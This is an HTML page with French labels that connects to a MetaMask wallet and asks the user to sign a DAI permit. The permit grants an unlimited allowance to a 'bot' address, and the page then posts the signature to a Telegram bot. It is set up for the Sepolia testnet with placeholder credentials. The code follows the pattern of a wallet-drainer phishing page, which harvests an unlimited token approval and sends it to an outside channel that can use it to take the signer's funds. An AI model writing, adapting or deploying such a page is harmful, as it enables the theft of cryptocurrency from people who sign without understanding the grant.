<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Meta DAI Permit</title>
  <!-- ethers v5 pour compatibilit√© navigateur -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.umd.min.js"></script>
</head>
<body>
  <h1>Signer DAI Permit et envoyer au bot</h1>
  <button onclick="signPermit()">Signer</button>

  <script>
    const BOT_TOKEN = "TON_BOT_TOKEN";
    const BOT_ETH_ADDRESS = "0xADRESSE_DU_BOT";
    const DAI = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844";
    const CHAIN_ID = 11155111; // Sepolia

    async function signPermit() {
      console.log("üîπ D√©but signPermit");

      if (!window.ethereum) {
        alert("MetaMask non d√©tect√© !");
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const owner = await signer.getAddress();
      console.log("Adresse MetaMask :", owner);

      const dai = new ethers.Contract(
        DAI,
        ["function nonces(address) view returns (uint256)", "function name() view returns (string)"],
        provider
      );

      const nonce = await dai.nonces(owner);
      const name = await dai.name();
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const domain = {
        name: name,
        version: "1",
        chainId: CHAIN_ID,
        verifyingContract: DAI
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ]
      };

      const values = {
        owner,
        spender: BOT_ETH_ADDRESS,
        value: ethers.constants.MaxUint256,
        nonce,
        deadline
      };

      console.log("Valeurs Permit :", values);

      // signer permit
      let signature;
      try {
        signature = await signer._signTypedData(domain, types, values);
        console.log("Signature :", signature);
      } catch(e) {
        console.error("Erreur signature :", e);
        alert("Erreur lors de la signature");
        return;
      }

      // envoyer au bot Telegram
      const payload = { user: owner, value: values.value.toString(), deadline, signature };
      console.log("Payload :", payload);

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: JSON.stringify(payload) })
        });
        const json = await res.json();
        console.log("R√©ponse Telegram :", json);
        alert("‚úÖ Permit sign√© et envoy√© au bot !");
      } catch(e) {
        console.error("Erreur Telegram :", e);
        alert("Erreur envoi au bot Telegram");
      }
    }
  </script>
</body>
</html>
